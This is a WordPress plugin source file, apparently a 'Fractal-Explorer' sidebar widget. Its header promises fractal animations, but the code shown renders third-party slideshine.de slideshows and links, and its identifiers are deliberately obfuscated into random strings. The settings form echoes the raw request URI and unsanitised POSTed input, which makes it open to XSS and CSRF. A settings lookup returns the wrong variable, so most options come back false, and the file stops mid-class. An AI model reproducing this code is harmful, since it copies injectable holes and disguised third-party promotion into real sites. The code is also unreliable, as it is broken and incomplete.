<?php
/*
Plugin Name: Fractal-Explorer
Plugin URI: http://web-fractals.sf.net/project.php
Description: Sidebar widget for the presentation and visualization of colored julia and mandelbrot fractals. Animated zoom realized as GIF animation is used to dive into and explore the internal structure of fractals.
Version: 0.3.0
Author: carlos26
Author URI: http://web-fractals.sf.net/author.php
*/

  abstract class Vkrhaltvxntdd {
     const Patgubfonybezi = 'options';
         const Gtfpoteid = 'submit';
     const Tvvoycfefaoivuiv = 'title';
 const Tblkgfpcjazv = 'count';
    const Xcvxbnrmakwoqjxb = 'mode';
  const Ldbbjuakyhuyqg = 'lang';
    const Wngopujlfmjph = 'compids';
   const Gkumqfgyhg = 0;
    const Gsysrgyuuzp = 1;
        const Qszdxawqoskzxo = 2;		
       const Fvxjgryaie = 'backend-title';
const Rknndzblgdrii = 'backend-count';
        const Mzrlmovjp = 'backend-compids';
        const Tqkhuyoakoyh = 'backend-mode';
        const Xxwqomaxuozn = 'backend-lang';
       const Wukcrkcruui = 'backend-head';
const Yjejptaawegggv = 'backend-foot';
        const Pkqdhejrxcwvh = 101;
      const Udexwopngat = 102;
  const Nrafnakezkbfqrrrr = 103;
      const Cqtreyaenok = 104;
       const Kasmcwvmzbgs = 105;
      const Moygnhexygg = 106;
       const Grjxcgzzmfut = 107;
        const Ococpfgugetzn = 108;
      const Ohoanajgxxs = 110;
     const Vxdbqdxpbi = 111;
     const Aarlilrgpe = 112;
     const Fmaviwvxgv = 120;
     const Dvzzdwbohvss = 0;
     const Hpipswbpmexo = 1;
     const Aebswqnstosi = 2;
   const Hbmnqnvzgn = 3;
  const Golntxcoi = 4;
         public function querySrjrvcnlfkczp($edsvtnimt, $zndipbxr, $glplrllefgu, $mvfpbnlwvny) {
  $options = get_option($this->buildInvcvryrcvtx(self::Patgubfonybezi));
         $title = $options['title'];
  $compids = $this->buildGcxehtrtytennuuy($options['compids'], $options['count']);
       $mode = $options['mode'];
       $lang = $options['lang'];
    $karma_data = Fttklnrbtgl::getInstance()->queryUanwlcuztionqw($compids);
        $translator = new Ithblbdwyexpijiuzgxa($lang);
        $renderer = $this->constructDtntrwvlsihhamqwq($translator, $mode);
        echo $edsvtnimt;
    echo $glplrllefgu . $title . $mvfpbnlwvny;
   echo $renderer->constructPlrlmqadbmru($karma_data);
       echo $zndipbxr;
   }
   public function setSbosvkqnwiezmyuzso() {
       $options = $this->queryRrfyuyevqjlcvucavyx();
         $title = $options['title'];
         $translator = new Ithblbdwyexpijiuzgxa($options['lang']);
echo '<p>' . $translator->setCpwosrmqyblq('backend.widgets.control.redirection', array(Ithblbdwyexpijiuzgxa::Ubcpinmwsqna => $this->constructLquwirpvbzlrg())) . '</p>';
     echo '<input type="hidden" id="' . $this->buildInvcvryrcvtx(self::Gtfpoteid) . '" name="' . $this->buildInvcvryrcvtx(self::Gtfpoteid) . '" value="1" />';
   }
      public function queryRrfyuyevqjlcvucavyx() {
        $translator = new Ithblbdwyexpijiuzgxa($this->createGldyuawgsq());
 $compids = explode(',', $this->getXjfenxenuqs());
shuffle($compids);
     $compids = array_slice(
     $compids, 0, 
      min(
  $this->setZxoknjblgqhs(Vkrhaltvxntdd::Aarlilrgpe),
       count($compids)
   )
    );
    for($arrYutcvdqcoohbris = 0; $arrYutcvdqcoohbris < count($compids); $arrYutcvdqcoohbris++) {
$compids[$arrYutcvdqcoohbris] = trim($compids[$arrYutcvdqcoohbris]);
   }
         $options = array(
        'title'=>$translator->setCpwosrmqyblq('frontend.title'),
       'compids'=>implode(', ', $compids),
 'mode'=>self::Qszdxawqoskzxo,
      'lang'=>$this->createGldyuawgsq(),
         'count'=>mt_rand(
   $this->setZxoknjblgqhs(Vkrhaltvxntdd::Ohoanajgxxs),
 $this->setZxoknjblgqhs(Vkrhaltvxntdd::Vxdbqdxpbi)
    ),
    );
         $opts = get_option($this->buildInvcvryrcvtx(self::Patgubfonybezi));
  if (!empty($opts)) {
     foreach ($opts as $key=>$value) {
      $options[$key] = $value;
   }
   }
    update_option($this->buildInvcvryrcvtx(self::Patgubfonybezi), $options);
        return $options;
   }
     public function setNmxdhcnqce() {
     $result = '';
       $options = $this->queryRrfyuyevqjlcvucavyx();
         $translator = new Ithblbdwyexpijiuzgxa($options['lang']);
         if ( $_POST[$this->buildInvcvryrcvtx(self::Gtfpoteid)] !== null ) {
      $valid = true;
  if ($this->setZxoknjblgqhs(self::Pkqdhejrxcwvh)) {
         $options['title'] = $_POST[$this->buildInvcvryrcvtx(self::Tvvoycfefaoivuiv)];
   }
if ($this->setZxoknjblgqhs(self::Udexwopngat)) {
      if (
         preg_match('/^\s*[0-9]+\s*$/', $_POST[$this->buildInvcvryrcvtx(self::Tblkgfpcjazv)]) &&
       (int) $_POST[$this->buildInvcvryrcvtx(self::Tblkgfpcjazv)] >= $this->setZxoknjblgqhs(Vkrhaltvxntdd::Ohoanajgxxs) &&
   (int) $_POST[$this->buildInvcvryrcvtx(self::Tblkgfpcjazv)] <= $this->setZxoknjblgqhs(Vkrhaltvxntdd::Vxdbqdxpbi)
     ) {
     $options['count'] = $_POST[$this->buildInvcvryrcvtx(self::Tblkgfpcjazv)];
} else {
    $result .= '
   <div class="updated">
<p><strong>' . $translator->setCpwosrmqyblq('backend.validation.count') . '</strong></p>
        </div>
    ';
   }
   }
if ($this->setZxoknjblgqhs(self::Cqtreyaenok)) {
        $options['mode'] = $_POST[$this->buildInvcvryrcvtx(self::Xcvxbnrmakwoqjxb)];
   }
 if ($this->setZxoknjblgqhs(self::Kasmcwvmzbgs)) {
      $options['lang'] = $_POST[$this->buildInvcvryrcvtx(self::Ldbbjuakyhuyqg)];
  $translator->queryZmovvtzmnvaza($options['lang']);
   }
      if ($this->setZxoknjblgqhs(self::Nrafnakezkbfqrrrr)) {
       if (preg_match('/^\s*([0-9]+,\s*)*[0-9]+\s*$/', $_POST[$this->buildInvcvryrcvtx(self::Wngopujlfmjph)])) {
        $options['compids'] = $_POST[$this->buildInvcvryrcvtx(self::Wngopujlfmjph)];
} else {
    $result .= '
   <div class="updated">
  <p><strong>' . $translator->setCpwosrmqyblq('backend.validation.compids') . '</strong></p>
        </div>
    ';
   }
   }
   if ($result === '') {
    $result .= '
   <div class="updated">
 <p><strong>' . $translator->setCpwosrmqyblq('backend.updated') . '</strong></p>
        </div>
    ';
    update_option($this->buildInvcvryrcvtx(self::Patgubfonybezi), $options);
   }
   }
         $title = $options['title'];
         $count = $options['count'];
   $compids = $options['compids'];
       $mode = $options['mode'];
       $lang = $options['lang'];
    $result .= '
 <div class="wrap"> 
      <form name="form1" method="post" action="' . $_SERVER['REQUEST_URI'] . '">
   <h2>' . $translator->setCpwosrmqyblq('backend.title', array(Ithblbdwyexpijiuzgxa::Ubcpinmwsqna => $this->constructLquwirpvbzlrg())) . '</h2> 
    ';
if ($this->setZxoknjblgqhs(self::Moygnhexygg)) {
    $result .= '
  <div class="' . $this->createGrmbknenadxt(self::Wukcrkcruui) . '">' . 
     $translator->setCpwosrmqyblq('backend.manual.top') . 
         '</div>
        <br />
    ';
   }
  if ($this->setZxoknjblgqhs(self::Pkqdhejrxcwvh)) {
    $result .= '
      <!-- title -->
     <p class="' . $this->createGrmbknenadxt(self::Fvxjgryaie) . '">
  <label for="' . $this->buildInvcvryrcvtx(self::Tvvoycfefaoivuiv) . '">
<b>' . $translator->setCpwosrmqyblq('backend.fieldlabel.title') . '</b>:<br />
 <span>' . $translator->setCpwosrmqyblq('backend.manual.title') . '</span><br />
        <input id="' . $this->buildInvcvryrcvtx(self::Tvvoycfefaoivuiv) . '" name="' . $this->buildInvcvryrcvtx(self::Tvvoycfefaoivuiv) . '" type="text" value="'.$title.'" />
</label>
      </p>
    ';
   }
if ($this->setZxoknjblgqhs(self::Udexwopngat)) {
    $result .= '
      <!-- count -->
        <p class="' . $this->createGrmbknenadxt(self::Rknndzblgdrii) . '">
        <label for="' . $this->buildInvcvryrcvtx(self::Tblkgfpcjazv) . '">
<b>' . $translator->setCpwosrmqyblq('backend.fieldlabel.count') . '</b>:<br />
 <span>' . $translator->setCpwosrmqyblq('backend.manual.count') . '</span><br />
<input id="' . $this->buildInvcvryrcvtx(self::Tblkgfpcjazv) . '" name="' . $this->buildInvcvryrcvtx(self::Tblkgfpcjazv) . '" type="text" value="'.$count.'" />
</label>
      </p>
    ';
   }
      if ($this->setZxoknjblgqhs(self::Nrafnakezkbfqrrrr)) {
    $result .= '
        <!-- compids -->
    <p class="' . $this->createGrmbknenadxt(self::Mzrlmovjp) . '">
         <label for="' . $this->buildInvcvryrcvtx(self::Wngopujlfmjph) . '">
  <b>' . $translator->setCpwosrmqyblq('backend.fieldlabel.compids') . '</b>:<br />
 <span>' . $translator->setCpwosrmqyblq('backend.manual.compids', array(Ithblbdwyexpijiuzgxa::Yczqmygwwck => $this->setZxoknjblgqhs(Vkrhaltvxntdd::Ococpfgugetzn))) . '</span><br />
    <input id="' . $this->buildInvcvryrcvtx(self::Wngopujlfmjph) . '" name="' . $this->buildInvcvryrcvtx(self::Wngopujlfmjph) . '" type="text" value="'.$compids.'" />
</label>
      </p>
    ';
   }
if ($this->setZxoknjblgqhs(self::Cqtreyaenok)) {
    $result .= '
     <!-- mode -->
       <p class="' . $this->createGrmbknenadxt(self::Tqkhuyoakoyh) . '">
  <label for="' . $this->buildInvcvryrcvtx(self::Xcvxbnrmakwoqjxb) . '">
         <b>' . $translator->setCpwosrmqyblq('backend.fieldlabel.mode') . '</b>:<br />
<span>' . $translator->setCpwosrmqyblq('backend.manual.mode') . '</span><br />
      <select id="' . $this->buildInvcvryrcvtx(self::Xcvxbnrmakwoqjxb) . '" name="' . $this->buildInvcvryrcvtx(self::Xcvxbnrmakwoqjxb) . '">
   ' . $this->buildMfdxbuvoqadzt(self::Gkumqfgyhg, $translator->setCpwosrmqyblq('backend.fieldlabel.image-mode'), $mode) . '
        ' . $this->buildMfdxbuvoqadzt(self::Gsysrgyuuzp, $translator->setCpwosrmqyblq('backend.fieldlabel.animation-mode'), $mode) . '
       ' . $this->buildMfdxbuvoqadzt(self::Qszdxawqoskzxo, $translator->setCpwosrmqyblq('backend.fieldlabel.image-animation-mode'), $mode) . '
 </select>
</label>
      </p>
    ';
   }
 if ($this->setZxoknjblgqhs(self::Kasmcwvmzbgs)) {
    $result .= '
     <!-- lang -->
       <p class="' . $this->createGrmbknenadxt(self::Xxwqomaxuozn) . '">
<label for="' . $this->buildInvcvryrcvtx(self::Ldbbjuakyhuyqg) . '">
   <b>' . $translator->setCpwosrmqyblq('backend.fieldlabel.language') . '</b>:<br />
    <span>' . $translator->setCpwosrmqyblq('backend.manual.language') . '</span><br />
  <select id="' . $this->buildInvcvryrcvtx(self::Ldbbjuakyhuyqg) . '" name="' . $this->buildInvcvryrcvtx(self::Ldbbjuakyhuyqg) . '">
         ' . $this->buildMfdxbuvoqadzt($this->createGldyuawgsq(), $translator->setCpwosrmqyblq('backend.fieldlabel.default'), $lang) . '
         ' . $this->buildMfdxbuvoqadzt(Ithblbdwyexpijiuzgxa::Wxqacvfrsehla, $translator->setCpwosrmqyblq('backend.fieldlabel.english'), $lang) . '
      ' . $this->buildMfdxbuvoqadzt(Ithblbdwyexpijiuzgxa::Qsbjcxaodpp, $translator->setCpwosrmqyblq('backend.fieldlabel.german'), $lang) . '
       ' . $this->buildMfdxbuvoqadzt(Ithblbdwyexpijiuzgxa::Cpawlnfxytl, $translator->setCpwosrmqyblq('backend.fieldlabel.spanish'), $lang) . '
 </select>
</label>
      </p>
    ';
   }
 if ($this->setZxoknjblgqhs(self::Grjxcgzzmfut)) {
    $result .= '
   <p class="' . $this->createGrmbknenadxt(self::Yjejptaawegggv) . '">' . 
        $translator->setCpwosrmqyblq('backend.manual.bottom') . 
       '</p>
    ';
   }
    $result .= '
    <!-- update switch -->
 <input type="hidden" id="' . $this->buildInvcvryrcvtx(self::Gtfpoteid) . '" name="' . $this->buildInvcvryrcvtx(self::Gtfpoteid) . '" value="1" />				
  <div class="submit">
        <input type="submit" name="submit" value="' . $translator->setCpwosrmqyblq('backend.save') . ' &raquo;" />
        </div>
         </form>
        </div>
    ';
     echo $result;
   }
    protected function buildMfdxbuvoqadzt($qpyyxjtaulc, $mccjvxohx, $ururbygoelujqn) {
      $selected = ($ururbygoelujqn == $qpyyxjtaulc ? 'selected' : '');
    return '<option value="' . $qpyyxjtaulc . '" ' . $selected . '>' . $mccjvxohx . '</option>';
   }
 protected function createGldyuawgsq() {
     $limitWdzwpuykkpk = get_locale();
    $limitWdzwpuykkpk = substr($limitWdzwpuykkpk, 0, 2);
switch ($limitWdzwpuykkpk) {
   case Ithblbdwyexpijiuzgxa::Wxqacvfrsehla:
 case Ithblbdwyexpijiuzgxa::Qsbjcxaodpp:
 case Ithblbdwyexpijiuzgxa::Cpawlnfxytl:
        break;
default:
        $limitWdzwpuykkpk = Ithblbdwyexpijiuzgxa::Wxqacvfrsehla;
        break;
   }
       return $limitWdzwpuykkpk;
   }
    public function constructImlapvzhcwfsc() {
       echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->setOohhdjlrgro() . '/style.css" type="text/css" media="screen" />';
   }
        public function setJqogchnqrvhok() {
        echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->setOohhdjlrgro() . '/style2.css" type="text/css" media="screen" />';
   }
  protected function buildGcxehtrtytennuuy($foqbqiypwr, $eixkbvcotwex) {
  $foqbqiypwr = explode(',', $foqbqiypwr);
        $rotationMode = $this->setZxoknjblgqhs(Vkrhaltvxntdd::Fmaviwvxgv);
      switch ($rotationMode) {
         case 0:
   shuffle($foqbqiypwr);
        break;
         case 1:
      $foqbqiypwr = $this->createFifffyyytzgdmoylxx($foqbqiypwr, $this->buildRowoqkqpz());
        break;
         case 2:
         $dateid = round(time() / (60*60*24));
$foqbqiypwr = $this->createFifffyyytzgdmoylxx($foqbqiypwr, $dateid);
        break;
         case 3:
   $combinedid = $this->buildRowoqkqpz() + ( round(time() / (60*60*24)) );
    $foqbqiypwr = $this->createFifffyyytzgdmoylxx($foqbqiypwr, $combinedid);
        break;
         case 4:
default:
        break;
   }
         $foqbqiypwr = array_slice($foqbqiypwr, 0, $eixkbvcotwex);
      for ($intYdjjncyvicl = 0; $intYdjjncyvicl < count($foqbqiypwr); $intYdjjncyvicl++) {
        $foqbqiypwr[$intYdjjncyvicl] = trim($foqbqiypwr[$intYdjjncyvicl]);
   }
 return $foqbqiypwr;
   }
       private function buildRowoqkqpz() {
       return round(crc32($_SERVER['REQUEST_URI']));
   }
    private function createFifffyyytzgdmoylxx($lpdmqoojukao, $mgjdsmucgze) {
 $Huootmqgxmxqeo = count($lpdmqoojukao);
if ($Huootmqgxmxqeo === 0) {
   return $lpdmqoojukao;
   }
 for ($limitHtljuwvwscomubu = 0; $limitHtljuwvwscomubu < $Huootmqgxmxqeo; $limitHtljuwvwscomubu++) {
    $pos = ($Huootmqgxmxqeo + $limitHtljuwvwscomubu + $mgjdsmucgze) % $Huootmqgxmxqeo;
 $reorderedArr[$limitHtljuwvwscomubu] = $lpdmqoojukao[$pos];
   }
   return $reorderedArr;
   }
  public abstract function constructLquwirpvbzlrg();
    public abstract function setOohhdjlrgro();
         public abstract function buildInvcvryrcvtx($xqmawjxwejo);
        public abstract function createGrmbknenadxt($wkcqedwiu);
     public abstract function constructDtntrwvlsihhamqwq($qhnxdfcauimb, $zdqoplrtgazla);
     public abstract function setZxoknjblgqhs($vaotdmwwr);
    public abstract function getXjfenxenuqs();
   }
        class Seklvenyfhzkajy extends Vdtapoiyaezffz {
       public function constructPlrlmqadbmru(&$phhfgwesvpgc) {
      $qhnxdfcauimb = $this->bvfmlmfgol;
         $zdqoplrtgazla = $this->lifsfuwbkijt;
  $html = '<div class="' . $this->createGrmbknenadxt(self::Qopfmyvoxshtqc) . '">';
      foreach ($phhfgwesvpgc as $data) {
  $html .= '
   <div class="' . $this->createGrmbknenadxt(self::Xpnfxgtoaokpautg) . '">
        <a href="' . $data['slideshowUrl'] . '" target="_blank">
  ' . $this->setAelffaigr($data, $zdqoplrtgazla) . '
      </a>
        </div>
    ';
   }
$html .= '</div>';
     return $html;
   }
 public function createGrmbknenadxt($vqtpkjpczi) {
    return 'fracexp-' . $vqtpkjpczi;
   }
   }
    class Dbkekgxihsig extends Vkrhaltvxntdd {
  const Rjujnhozvd = '
   21780, 21759, 21738, 21721, 23303, 24256, 26645, 27147, 27273, 28217, 28680, 28928, 29042, 29777, 30333, 30423,
    ';
   public function __construct() {
   }
    public function constructLquwirpvbzlrg() {
       return 'FractalExplorer';
   }
      public function setOohhdjlrgro() {
        return 'fractal-explorer';
   }
public function buildInvcvryrcvtx($fxqsoddyox) {
  return 'fractalexplorer-' . $fxqsoddyox;
   }
 public function createGrmbknenadxt($hykhziqkhy) {
    return 'fracexp-' . $hykhziqkhy;
   }
     public function constructDtntrwvlsihhamqwq($grahwvuyygwas, $yuwrzdqktz) {
   $renderer = new Seklvenyfhzkajy($grahwvuyygwas, $yuwrzdqktz);
         return $renderer;
   }
         public function setZxoknjblgqhs($cjgrdtdrbef) {
        $result = false;
     switch ($cjgrdtdrbef) {
    case Vkrhaltvxntdd::Ohoanajgxxs:
    $result = 1;
        break;
   case Vkrhaltvxntdd::Vxdbqdxpbi:
     $strCstubhudlhdkzs = 3;
        break;
   case Vkrhaltvxntdd::Aarlilrgpe:
     $strCstubhudlhdkzs = 5;
        break;
   case Vkrhaltvxntdd::Fmaviwvxgv:
         $strCstubhudlhdkzs = Vkrhaltvxntdd::Hbmnqnvzgn;
        break;
    case Vkrhaltvxntdd::Moygnhexygg:
     case Vkrhaltvxntdd::Kasmcwvmzbgs:
         $strCstubhudlhdkzs = false;
        break;
      case Vkrhaltvxntdd::Ococpfgugetzn:
         $strCstubhudlhdkzs = array(
        'Fractals' => 'http://slideshine.de/categories/tags.php/Fraktale',
      'I\'m Feeling Lucky' => 'http://slideshine.de/index.php?page=Posts.RandomSlideshow',
    'more ...' => 'http://slideshine.de/categories/tags.php/Alle',
    );
        break;
default:
        $strCstubhudlhdkzs = true;
        break;
   }
        return $strCstubhudlhdkzs;
   }
      public function getXjfenxenuqs() {
      return self::Rjujnhozvd;
   }
   }
class Ithblbdwyexpijiuzgxa {
         const Wxqacvfrsehla = 'en';
       const Qsbjcxaodpp = 'de';
       const Cpawlnfxytl = 'es';
    const Ubcpinmwsqna = 'widgetId';
const Yczqmygwwck = 'links';
  private $yycpndzwpl;
      public function __construct($vbpxilnsecjwhvw = null) {
 $this->yycpndzwpl = ($vbpxilnsecjwhvw === null ? self::Wxqacvfrsehla : $vbpxilnsecjwhvw);
   }
        public function setCpwosrmqyblq($cpqcuzjjfm, $xizciggfrc = null) {
    $en = array(
        'frontend.author' => 'by',
'frontend.slideshows' => 'Slideshows',
  'frontend.images' => 'Images',
      'frontend.comments' => 'Comments',
'frontend.karma' => 'Karma',
    'frontend.title' => 'My images',
         'backend.validation.compids' => 'Slideshow-IDs invalid.',
   'backend.validation.count' => 'Number of images invalid (i.e. not an integer, too low or too high).',
   'backend.updated' => 'Settings updated.',
       'backend.title' => '' . $xizciggfrc[Ithblbdwyexpijiuzgxa::Ubcpinmwsqna] . ' Options',
 'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
        'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
  'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
         'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->buildYagrkxbag($xizciggfrc[Ithblbdwyexpijiuzgxa::Yczqmygwwck]),
'backend.manual.mode' => 'Select display mode.',
     'backend.manual.language' => 'Select your language.',
       'backend.save' => 'Save',
'backend.fieldlabel.title' => 'Title',
 'backend.fieldlabel.count' => 'Number of images',
'backend.fieldlabel.compids' => 'Slideshow-IDs',
        'backend.fieldlabel.mode' => 'Mode',
      'backend.fieldlabel.language' => 'Language',
        'backend.fieldlabel.default' => '(automatic)',
    'backend.fieldlabel.english' => 'english',
  'backend.fieldlabel.german' => 'german',
    'backend.fieldlabel.spanish' => 'spanish',
'backend.fieldlabel.image-mode' => 'Image only',
  'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
    'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
      'backend.widgets.control.redirection' => 'Please go to [Admin Menu] -> [Settings] -> [' . $xizciggfrc[Ithblbdwyexpijiuzgxa::Ubcpinmwsqna] . ']',
    );
    $de = array(
         'frontend.author' => 'von',
'frontend.slideshows' => 'Slideshows',
  'frontend.images' => 'Bilder',
        'frontend.comments' => 'Kommentare',
'frontend.karma' => 'Karma',
       'frontend.title' => 'Meine Bilder',
 'backend.validation.compids' => 'Slideshow-IDs ungültig.',
        'backend.validation.count' => 'Anzahl von Bildern ungültig (d.h. keine Ganzzahl, zu klein or zu groß).',
  'backend.updated' => 'Einstellungen gespeichert.',
   'backend.title' => '' . $xizciggfrc[Ithblbdwyexpijiuzgxa::Ubcpinmwsqna] . ' Einstellungen',
 'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
        'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
  'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
         'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->buildYagrkxbag($xizciggfrc[Ithblbdwyexpijiuzgxa::Yczqmygwwck]),
'backend.manual.mode' => 'Select display mode.',
     'backend.manual.language' => 'Select your language.',
  'backend.save' => 'Speichern',
'backend.fieldlabel.title' => 'Titel',
   'backend.fieldlabel.count' => 'Anzahl von Bildern',
'backend.fieldlabel.compids' => 'Slideshow-IDs',
         'backend.fieldlabel.mode' => 'Modus',
     'backend.fieldlabel.language' => 'Sprache',
'backend.fieldlabel.default' => '(automatisch)',
     'backend.fieldlabel.english' => 'englisch',
   'backend.fieldlabel.german' => 'deutsch',
     'backend.fieldlabel.spanish' => 'spanisch',
'backend.fieldlabel.image-mode' => 'Image only',
  'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
    'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
         'backend.widgets.control.redirection' => 'Siehe [Admin Menu] -> [Settings] -> [' . $xizciggfrc[Ithblbdwyexpijiuzgxa::Ubcpinmwsqna] . ']',
    );
    $es = array(
        'frontend.author' => 'de',
'frontend.slideshows' => 'Slideshows',
    'frontend.images' => 'Imagenes',
         'frontend.comments' => 'Comentarios',
'frontend.karma' => 'Karma',
   'frontend.title' => 'Imagenes',
    'backend.validation.compids' => 'Slideshow-IDs están nulos.',
   'backend.validation.count' => 'Number of images invalid (i.e. not an integer, too low or too high).',
     'backend.updated' => 'Opciones guardadas.',
        'backend.title' => '' . $xizciggfrc[Ithblbdwyexpijiuzgxa::Ubcpinmwsqna] . ' Opciones',
        'backend.manual' => 'Configuration',
 'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
        'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
  'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
         'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->buildYagrkxbag($xizciggfrc[Ithblbdwyexpijiuzgxa::Yczqmygwwck]),
'backend.manual.mode' => 'Select display mode.',
     'backend.manual.language' => 'Select your language.',
        'backend.save' => 'Guardar Cambios',
  'backend.fieldlabel.title' => 'Título',
   'backend.fieldlabel.count' => 'Imagenes',
'backend.fieldlabel.compids' => 'Slideshow-IDs',
        'backend.fieldlabel.mode' => 'Modo',
    'backend.fieldlabel.language' => 'Lingua',
'backend.fieldlabel.default' => '(automático)',
   'backend.fieldlabel.english' => 'ingles',
   'backend.fieldlabel.german' => 'alemán',
     'backend.fieldlabel.spanish' => 'español',
'backend.fieldlabel.image-mode' => 'Image only',
  'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
    'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
   'backend.widgets.control.redirection' => '[Admin Menu] -> [Settings] -> [' . $xizciggfrc[Ithblbdwyexpijiuzgxa::Ubcpinmwsqna] . ']',
    );
      $intCiebvxgzric = array(
         self::Wxqacvfrsehla => $en,
       self::Qsbjcxaodpp => $de,
      self::Cpawlnfxytl => $es
    );
       return $intCiebvxgzric[$this->yycpndzwpl][$cpqcuzjjfm];
   }
 public function queryZmovvtzmnvaza($bnaiikxwxp) {
    $this->yycpndzwpl = $bnaiikxwxp;
   }
         private function buildYagrkxbag($pqspiqlhxvl) {
if ($pqspiqlhxvl === null) {
         return;
   }
        $strLsibyndxmfe = array();
    foreach ($pqspiqlhxvl as $key => $value) {
       $strLsibyndxmfe[] .= '<a href="' . $value . '">' . $key . '</a>';
   }
      return implode(' &bull; ', $strLsibyndxmfe);
   }
   }
   abstract class Vdtapoiyaezffz {
   const Gkumqfgyhg = 0;
    const Gsysrgyuuzp = 1;
       const Qszdxawqoskzxo = 2;
       const Qopfmyvoxshtqc = 'container';
       const Xpnfxgtoaokpautg = 'element';
    const Zjfpelzwyfdd = 'karmabar';
 const Zofvulzasmca = 'karmabar-filled';
 const Lleafmdgudg = 'karmabar-default';
        const Hmwvfjflvsr = 'img';
 const Ytthsvicdkya = 'title';
     const Cokgcukexsgfgcu = 'author';
         const Bdkwkxblqg = 'stats';
        const Bikbckxbxx = 'list';
      const Okuobirurugd = 'slideshows';
    const Fluwkldemgirzb = 'images';
      const Keftsgrodghxdv = 'comments';
 protected $bvfmlmfgol = null;
   protected $lifsfuwbkijt = null;
        public function __construct($liawwrldtqpw, $ozxkyaqobfhv = null) {
      $this->bvfmlmfgol = $liawwrldtqpw;
     $this->lifsfuwbkijt = ($ozxkyaqobfhv === null ? self::Gsysrgyuuzp : $ozxkyaqobfhv);
   }
     protected function setLqzyxjjvmskgpuk($vqdfnntbjosevrh, $kdgfdraalh = 0, $mmmgccrfgygs = 0) {
     $countSljlacjgn = htmlspecialchars($vqdfnntbjosevrh);
     if ($kdgfdraalh > 0 && strlen($countSljlacjgn) > $kdgfdraalh) {
        $countSljlacjgn = substr($countSljlacjgn, 0, $kdgfdraalh) . '...';
   }
     return $countSljlacjgn;
   }
        public function createRqrpghyiyz($roipcmmbp) {
       $karmabar = "<font class='" . $this->createGrmbknenadxt(self::Zofvulzasmca) . "'>" . str_repeat("|", $roipcmmbp) . "</font>";
         $tail = "<font class='" . $this->createGrmbknenadxt(self::Lleafmdgudg) . "'>" . str_repeat("|", (25 - $roipcmmbp)) . "</font>";
       return $karmabar . $tail;
   }
   protected function setAelffaigr(&$maanhmybakrm, $lumwgnvjp) {
  $img = '';
 $thumbSrc = $this->queryJfgatcgiv($maanhmybakrm);
$gifSrc = $this->setQipxucnhqcpq($maanhmybakrm);
   switch ($lumwgnvjp) {
    case self::Gkumqfgyhg:
         $img = '<img src="' . $thumbSrc . '" 
  class="' . $this->createGrmbknenadxt(self::Hmwvfjflvsr) . '"
     alt="' . $this->setLqzyxjjvmskgpuk($maanhmybakrm['title']) . '"
       title="' . $this->setLqzyxjjvmskgpuk($maanhmybakrm['title']) . '"
      />';
        break;
        case self::Qszdxawqoskzxo:
         $img = '<img src="' . $thumbSrc . '" 
  class="' . $this->createGrmbknenadxt(self::Hmwvfjflvsr) . '"
     alt="' . $this->setLqzyxjjvmskgpuk($maanhmybakrm['title']) . '"
       title="' . $this->setLqzyxjjvmskgpuk($maanhmybakrm['title']) . '"
     onmouseover="this.src=\'' . $gifSrc . '\'" 
     onmouseout="this.src=\'' . $thumbSrc . '\'"
      />';
        break;
     case self::Gsysrgyuuzp:
       $img = '<img src="' . $gifSrc . '" 
  class="' . $this->createGrmbknenadxt(self::Hmwvfjflvsr) . '"
     alt="' . $this->setLqzyxjjvmskgpuk($maanhmybakrm['title']) . '"
       title="' . $this->setLqzyxjjvmskgpuk($maanhmybakrm['title']) . '"
      />';
        break;
default:
  $img = '';
   }
    return $img;
   }
  protected function queryJfgatcgiv(&$slqcthfi, $odvbmobhzfcxw = null) {
     $imgSrc = '';
 if ($odvbmobhzfcxw != null) {
       $imgSrc = $odvbmobhzfcxw;
   }
      if ($slqcthfi != null) {
        $imgSrc = $slqcthfi['thumbnailUrl'];
   }
       return $imgSrc;
   }
